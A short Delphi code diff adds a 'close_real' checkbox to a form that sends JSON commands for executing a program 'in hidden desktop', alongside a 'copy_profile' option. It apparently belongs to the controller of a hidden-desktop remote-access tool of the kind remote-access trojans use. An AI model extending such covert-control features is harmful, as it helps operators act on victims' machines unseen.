@@ -24,6 +24,7 @@ type
     ComboBox1 : TComboBox;
     ComboBox2 : TComboBox;
     CheckBox1 : TCheckBox;
+    CheckBox2 : TCheckBox;
 
     procedure FormClose(Sender: TObject; var Action: TCloseAction);
     procedure Button1Click(Sender: TObject);
@@ -530,6 +531,10 @@ begin
       JSONObj.AddPair('copy_profile', TJSONBool.Create(CheckBox1.Checked))
     else
       JSONObj.AddPair('copy_profile', TJSONBool.Create(False));
+    if Assigned(CheckBox2) then
+      JSONObj.AddPair('close_real', TJSONBool.Create(CheckBox2.Checked))
+    else
+      JSONObj.AddPair('close_real', TJSONBool.Create(False));
     FSendJSON(FLine, JSONObj);
     LogToStatus('Executing ' + ComboBox2.Text + ' in hidden desktop...');
   finally
